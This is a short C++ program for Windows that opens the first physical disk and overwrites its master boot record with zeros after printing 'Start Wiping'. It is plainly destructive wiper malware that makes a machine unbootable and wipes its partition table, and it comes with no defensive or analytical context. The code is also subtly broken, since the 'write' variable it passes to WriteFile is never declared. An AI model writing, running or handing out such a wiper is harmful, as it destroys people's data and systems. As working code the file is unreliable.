#include <Windows.h>
#include <iostream>
#include <ctime>
#include <stdio.h>

#define MBR_SIZE 512

using namespace std;

int WipeMBR(void) {
    char dmbr[MBR_SIZE];

    ZeroMemory(&dmbr, sizeof(dmbr));
    HANDLE disk = CreateFile((LPCSTR)"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    WriteFile(disk, dmbr, MBR_SIZE, &write, NULL);
    CloseHandle(disk);
    return 0;
}

int main() {
    cout << "Start Wiping" << endl;
    WipeMBR();
    return 0;
}
